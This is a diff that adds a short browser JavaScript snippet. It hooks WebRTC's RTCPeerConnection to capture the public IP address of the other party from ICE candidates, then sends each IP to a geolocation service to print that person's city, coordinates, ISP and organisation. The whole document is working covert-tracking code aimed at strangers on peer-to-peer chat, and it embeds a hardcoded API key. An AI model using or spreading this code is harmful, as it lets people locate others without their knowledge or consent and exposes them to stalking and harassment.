@@ -1,0 +1,47 @@
+const apiKey = "1d9d25fe659641bcbc3b27e43712b275";
+const processedIPs = new Set();
+
+window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+    const pc = new window.oRTCPeerConnection(...args);
+    pc._addIceCandidate = pc.addIceCandidate;
+
+    pc.addIceCandidate = function (iceCandidate, ...rest) {
+        const candidate = iceCandidate?.candidate;
+        if (candidate && candidate.includes("srflx")) {
+            const parts = candidate.split(" ");
+            const ip = parts[4];
+            if (ip && !processedIPs.has(ip)) {
+                processedIPs.add(ip);
+                getLocation(ip);
+            }
+        }
+        return pc._addIceCandidate(iceCandidate, ...rest);
+    };
+    return pc;
+};
+
+const getLocation = async (ip) => {
+    console.log("🔍 Tracing IP:", ip);
+
+    try {
+        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`);
+        if (!res.ok) throw new Error(`API error: ${res.status}`);
+        const data = await res.json();
+
+        console.log("📍 Location Info Found ↓↓↓↓↓↓↓");
+        console.table({
+            IP: data.ip,
+            City: data.city,
+            State: data.state_prov,
+            Country: data.country_name,
+            Location: `${data.latitude}, ${data.longitude}`,
+            ISP: data.isp,
+            Organization: data.organization,
+            Timezone: data.time_zone.name
+        });
+    } catch (err) {
+        console.error("❌ Failed to fetch location:", err.message);
+    }
+};
